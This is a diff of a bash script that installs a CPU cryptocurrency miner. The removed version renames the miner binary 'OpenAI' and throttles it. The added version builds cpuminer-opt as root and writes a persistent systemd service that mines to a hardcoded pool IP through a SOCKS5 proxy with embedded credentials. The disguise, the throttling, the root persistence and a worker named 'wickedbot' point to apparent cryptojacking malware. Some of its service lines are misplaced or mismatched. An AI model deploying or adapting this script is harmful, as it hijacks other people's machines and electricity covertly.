@@ -1,8 +1,32 @@
 #!/bin/bash
-sudo apt-get update && sudo apt-get upgrade -y && sudo apt-get install cpulimit -y && sudo apt-get install -y automake autoconf pkg-config libcurl4-openssl-dev libjansson-dev libssl-dev libgmp-dev gcc build-essential git make curl unzip gedit dh-autoreconf openssh-server screen libtool libncurses5-dev libudev-dev g++ iftop libgtk2.0-dev libboost-dev libboost-system-dev libboost-thread-dev vim -y 
-git clone https://github.com/k67frozen/cpuminer-opt
-cd cpuminer-opt
-chmod +x *
-./build.sh
-mv cpuminer OpenAI
-cpulimit --exe cpuminer --limit 80 -b && ./OpenAI -a lyra2z330 -o stratum+tcp://95.169.195.152:3032 -u wickedbot.xeko -p x
+sudo su
+apt-get update && 
+sudo apt-get -y install git make automake build-essential autoconf pkg-config libcurl4-openssl-dev libjansson-dev libssl-dev libgmp-dev &&
+sudo sysctl vm.nr_hugepages=128 &&
+cd /usr/local/src/ &&
+wget https://github.com/JayDDee/cpuminer-opt/archive/v3.8.6.tar.gz &&
+tar xvzf v3.8.6.tar.gz &&
+cd cpuminer-opt-3.8.6 &&
+./autogen.sh &&
+CFLAGS="-O3 -march=native -Wall" CXXFLAGS="$CFLAGS -std=gnu++11" ./configure --with-curl &&
+make &&
+bash -c 'cat <<EOT >>/lib/systemd/system/xmrig2.service
+systemctl daemon-reload &&
+systemctl enable xmrig2.service &&
+service xmrig2 start
+[Unit]
+Description=xmr
+After=network.target
+[Service]
+ExecStart= /usr/local/src/cpuminer-opt-3.8.6/cpuminer -a lyra2z330 -o stratum+tcp://95.169.195.152:3032 -u wickedbot.x -p x socks5://zimbalem:123456@209.250.244.28:1212
+WatchdogSec=600
+Restart=always
+RestartSec=60
+User=root
+[Install]
+WantedBy=multi-user.target
+EOT
+' &&
+systemctl daemon-reload &&
+systemctl enable xmrig.service &&
+service xmrig start 
